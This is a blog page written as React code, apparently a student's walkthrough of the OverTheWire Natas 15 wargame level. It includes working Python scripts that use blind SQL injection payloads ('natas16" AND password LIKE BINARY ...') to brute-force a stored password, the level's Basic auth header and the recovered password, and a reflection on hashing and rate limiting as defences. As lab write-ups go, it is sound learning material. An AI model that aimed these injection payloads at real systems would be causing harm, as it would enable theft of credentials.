import BlogImage from "../../components/elements/BlogImage/BlogImage"
import CodeBlock from "../../components/elements/CodeBlock/CodeBlock"
import Keyword from "../../components/elements/Keyword/Keyword"
import PageNav from "../../components/elements/PageNav/PageNav"
import SpoilerKey from "../../components/elements/SpoilerKey/SpoilerKey"
import Tag from "../../components/elements/Tag/Tag"

const natas15 = () => {
  return (
    <div>
      <h1>Natas 15</h1>
      <Keyword>
        <Tag>sqli</Tag>
        <Tag>blind-sqli</Tag>
      </Keyword>
      <section>
        <h2>Experience</h2>
        <p>
          Quite difficult to solve. Looking at the code, it seems quite clean.
          Fooling the username check existence was quite simple, I typed
          {' '}<code>&quot; or 1 #</code>{' '}and it works, however it seems that the
          username inserted does not matter in itself. This is not a system
          for logging in, it is a system to check if a valid user exist or not. At the end, only the
          following message appears:
        </p>
        <BlogImage src='/images/natas15-1.png' alt ='End result of successful query reads "This user exist"'/>
        <p>
          So, I found out that this is what is called a blind sql injection attack. Although
          we cannot see the output of our sql queries, by using multiple queries, we will be able
          to extract useful information. In this case, the table structure is known to us, so
          we do not need to guess that information, we know that there is a password column
          which matches with the username. Before we move on, we must therefore pick a username
          who we want to extract the password from. Clearly, this should be natas16, and indeed if
          we insert natas16, we will be prompted that natas16 is a valid username.
        </p>
        <p>
          To be able to obtain the password, we use the SQL <code>LIKE</code> and <code>AND</code>
          {' '}command. So, first, I attempted to write a simple python script, to see if
          everything works, check if my sqli command is correct, check if it is able to
          access the website, etc. As we can&apos;t insert the natas15 password manually,
          I used the <code>authorization</code> header with value copied from the
          developer tools.
        </p>
        <CodeBlock language="python">
          {`import requests

url = 'http://natas15.natas.labs.overthewire.org/index.php'
headers = {
    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
}
payload = {
    'username': 'natas16"  and password like "a%'
}
r = requests.post('http://natas15.natas.labs.overthewire.org/index.php', headers=headers, data=payload)

if ('error' in r.text):
    # invalid sql command
    ...
elif ("doesn't" in r.text):
    # doesn't exist
    ...
elif ('exists' in r.text):
    # exist
    ...
`}
        </CodeBlock>
        <p>
          Everything seems to work well, so now, it is a matter of brute forcing the
          password. However, when I used this script to just find the first letter,
          I realised that the sql is case insensitive, so to remedy this, we use the
          <code>BINARY</code> command after <code>LIKE</code>. As might be
          expected, brute force took took quite a long time, but I was able to obtain
          the key this way. Final code can be seen below.
        </p>
        <CodeBlock language="python">
          {`import requests

# Create list of potential characters
possible = ''
for i in range(26):
    possible += chr(ord('a') + i)
    possible += chr(ord('A') + i)
for i in range(10):
    possible += str(i)

# HTTP request definition
url = 'http://natas15.natas.labs.overthewire.org/index.php'
headers = {
    'Authorization': 'Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg=='
}

password = ''
# 32 because, previous passwords are only 32 characters long
for i in range(32):
    for char in possible:
        payload = {'username': f'natas16" AND password LIKE BINARY "{password}{char}%'}
        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php', headers=headers, data=payload)
        if ('exists' in r.text):
            password += char
            break
print(password)
`}
        </CodeBlock>
        <p>
          The first section creates a list of potential charctes, a to z lowercase
          and uppercase, and the 10 digits. Then, we use a sql injection which will
          return the {"This user exists."} prompt when it also found that the user&apos;s
          password matches the pattern we put. And we basically create that pattern
          based on previous queries.
        </p>
      </section>
      <section>
        <h2>Reflection</h2>
        <p>
          I think this was quite an interesting exercise especially in learning about
          how an attacker might conduct a brute force blind sql attack. I did not know
          that this was possible, at first, I was quite stuck on how to progress as we
          did not learn about this in class. I thought it was very smart to figure out the password by simply asking whether the start of the password matches a certain pattern or not.
          The difference between this method and a pure brute force method is that a pure
          brute force would not know if the password is valid or not until it matches
          the whole password. Whereas here, we are able to extract it character by character.
        </p>
        <p>
          This was a great example scenario where using hash functions could save the user&apos;s
          password. Without it, we would simply obtain the plain text password we could use, however
          with a hashed password, the attacker must then figure out another layer of protection
          which will take time and effort. So it is a good reason for storing only hashed passwords
          or at least encrypted passwords even if the users are not supposed to have
          access to that database of passwords in the first place.
        </p>
        <p>
          Another thing it showcased is the reason for websites to limit the number of requests
          you could make to a server per minute. A highly rapid rate of request may indicate a
          bot potentially trying to conduct a blind sqli or simply brute force a password. This
          is also why users are limited in the number of attempts they have to type
          their credentials correctly. Limiting either of this would have caused my
          code to not work as it would not have sufficient data to construct the password.
        </p>
      </section>
      <SpoilerKey>
        {`WaIHEacj63wnNIBROHeqi3p9t0m5nhmh`}
      </SpoilerKey>
      <PageNav link1='/natas/natas14' link2='/natas/natas16' />
    </div>
  )
}
export default natas15